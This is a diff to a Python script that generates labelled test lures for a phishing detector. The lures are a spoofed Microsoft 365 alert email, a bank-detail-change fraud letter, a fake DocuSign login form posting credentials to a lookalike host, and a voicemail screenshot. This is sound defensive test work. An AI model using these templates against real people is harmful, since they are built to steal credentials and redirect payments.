@@ -25,6 +25,12 @@ DECEPTIVE_SHOWN, DECEPTIVE_REAL = "https://www.contoso.com/billing", "https://pa
 SCANNED = "https://overdue-billing.example/pay"
 QR = "https://quish-test.example/login"
 PHONE = "(800) 555-0143"
+SHOWN_MS = "https://account.microsoft.com/security"
+MFA_QR = "https://mfa-reverify.example/start"
+SEC_PHONE = "(800) 555-0177"
+BEC_PHONE = "(800) 555-0187"
+VM_PHONE = "+1 (800) 555-0199"
+VM_URL = "https://vm-listen.example/play"
 FILLER = ("This section summarizes vendor performance for the quarter, including delivery timeliness, invoice "
           "accuracy and service-level adherence. Figures are illustrative test content only. ") * 6
 
@@ -79,6 +85,79 @@ def report_html(work: Path) -> Path:
     return p
 
 
+def voicemail_png(path: Path) -> None:
+    """A screenshot-style lure: the number and URL exist only as pixels."""
+    img = Image.new("RGB", (1200, 420), (245, 247, 250))
+    d = ImageDraw.Draw(img)
+    big, small = ImageFont.truetype(FONT, 42), ImageFont.truetype(FONT, 32)
+    d.text((50, 50), "New voicemail (0:42) - TEST SAMPLE", font=big, fill="black")
+    d.text((50, 150), f"From: {VM_PHONE}", font=small, fill="black")
+    d.text((50, 220), f"Listen here: {VM_URL}", font=small, fill="black")
+    d.text((50, 300), "Expires in 24 hours", font=small, fill=(180, 0, 0))
+    img.save(path)
+
+
+def preview_set(out: Path, work: Path) -> None:
+    """Everyday-looking lures for demos: a forwarded phishing email, a BEC letter, an HTML login page,
+    a voicemail screenshot, and a clean spreadsheet. All benign."""
+    from email.message import EmailMessage
+
+    # 1. Forwarded phishing email: spoofed display name, lookalike domain, failed auth, deceptive link,
+    #    an inline QR image and an attached PDF with a callback number.
+    rep = work / "Security-Report.html"
+    rep.write_text("<html><body><h1>Microsoft 365 Security Report (TEST SAMPLE)</h1>"
+                   "<p>We blocked 3 sign-in attempts on your account.</p>"
+                   f"<p>If this wasn't you, call the security desk now at {SEC_PHONE}.</p></body></html>")
+    soffice(rep, "pdf:writer_pdf_Export", work, "HTML (StarWriter)")
+    qr = work / "qr-mfa.png"
+    qrcode.make(MFA_QR, box_size=8, border=4).save(qr)
+    msg = EmailMessage()
+    msg["From"] = '"Microsoft 365 Security" <no-reply@micros0ft-alerts.example>'
+    msg["Reply-To"] = "helpdesk@quick-support.example"
+    msg["To"] = "analyst@contoso.com"
+    msg["Subject"] = "Action required: unusual sign-in activity (TEST SAMPLE)"
+    msg["Date"] = "Tue, 10 Nov 2026 08:14:00 -0800"
+    msg["Message-ID"] = "<test-sample-0001@micros0ft-alerts.example>"
+    msg["Authentication-Results"] = "mx.contoso.com; spf=fail smtp.mailfrom=micros0ft-alerts.example; dkim=none; dmarc=fail"
+    msg.set_content("We detected an unusual sign-in. Review it at https://micros0ft-alerts.example/review "
+                    "or scan the code. TEST SAMPLE ONLY.")
+    msg.add_alternative(
+        "<html><body><p>We detected an unusual sign-in to your account.</p>"
+        f'<p><a href="https://micros0ft-alerts.example/review?u=analyst">{SHOWN_MS}</a></p>'
+        '<p>Or scan to re-verify MFA:</p><p><img src="cid:qr1"></p>'
+        "<p>TEST SAMPLE ONLY.</p></body></html>", subtype="html")
+    msg.get_payload()[1].add_related(qr.read_bytes(), "image", "png", cid="<qr1>", filename="qr-mfa.png")
+    msg.add_attachment((work / "Security-Report.pdf").read_bytes(), maintype="application", subtype="pdf",
+                       filename="Security-Report.pdf")
+    (out / "fwd-account-alert.eml").write_bytes(bytes(msg))
+
+    # 2. BEC: a plain letter asking to change bank details. No links, no macros: the content IS the threat.
+    bec = work / "vendor-bank-change.html"
+    bec.write_text("<html><body><h2>Northwind Supplies (TEST SAMPLE)</h2><p>Dear Accounts Payable,</p>"
+                   "<p>Please note our banking details have changed effective immediately. All open invoices "
+                   "should be remitted to our new account below. Our old account is under audit and payments "
+                   "sent there will be returned.</p><p>Bank: Example Federal Bank<br>Routing: 000000000 (TEST)<br>"
+                   f"Account: 0000000000 (TEST)</p><p>To confirm, call our controller directly at {BEC_PHONE}. "
+                   "Please do not use the number on file.</p><p>Regards,<br>J. Smith, Controller</p></body></html>")
+    soffice(bec, "docx:MS Word 2007 XML", out, "HTML (StarWriter)")
+
+    # 3. HTML attachment that is a fake sign-in page (password field, posts to a lookalike).
+    (out / "shared-document.html").write_text(
+        "<html><head><title>DocuSign - Review Document</title></head><body>"
+        "<h2>DocuSign</h2><p>You have a document to review. Sign in to continue. TEST SAMPLE ONLY.</p>"
+        '<form action="https://docusign-secure-view.example/submit" method="post">'
+        '<input name="email" type="email"><input name="pw" type="password"><button>Sign in</button></form>'
+        "</body></html>")
+
+    # 4. Voicemail screenshot (OCR finds the number and the link).
+    voicemail_png(out / "voicemail.png")
+
+    # 5. A clean spreadsheet: the common case, which should come back NO DETECTIONS.
+    csv = work / "timesheet.csv"
+    csv.write_text("Employee,Mon,Tue,Wed,Thu,Fri,Total\nA. Analyst,8,8,8,8,8,40\nB. Analyst,8,8,7.5,8,8,39.5\n")
+    soffice(csv, "xlsx:Calc MS Excel 2007 XML", out, "CSV:44,34,76,1")
+
+
 def main(out: Path) -> None:
     out.mkdir(parents=True, exist_ok=True)
     work = Path(tempfile.mkdtemp())
@@ -94,6 +173,7 @@ def main(out: Path) -> None:
     (out / "update.js").write_text('// TEST SAMPLE: harmless text, never executed\n'
                                    'var u = "https://dl-test.example/payload.bin";\n'
                                    'WScript.Echo("this is a test sample: " + u);\n')
+    preview_set(out, work)
     for p in sorted(out.iterdir()):
         print(f"{p.stat().st_size:>9}  {p.name}")
 
